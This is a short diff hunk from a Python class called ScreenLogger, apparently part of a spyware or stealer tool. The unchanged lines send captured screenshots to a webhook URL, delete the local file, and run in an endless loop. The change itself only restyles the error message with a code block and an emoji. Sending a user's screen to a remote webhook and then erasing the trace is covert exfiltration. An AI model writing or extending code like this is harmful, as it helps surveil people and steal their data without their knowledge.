@@ -18,7 +18,7 @@ class ScreenLogger:
             send_webhook(self.webhook_url, file={"screen_logs.png": open(self.log_file, "rb")})
             os.remove(self.log_file)
         except Exception as e:
-            send_webhook(self.webhook_url, f"Error logging screen: {e}")
+            send_webhook(self.webhook_url, f"```❌ Error logging screen: {e}```")
 
     def start(self):
         while True:
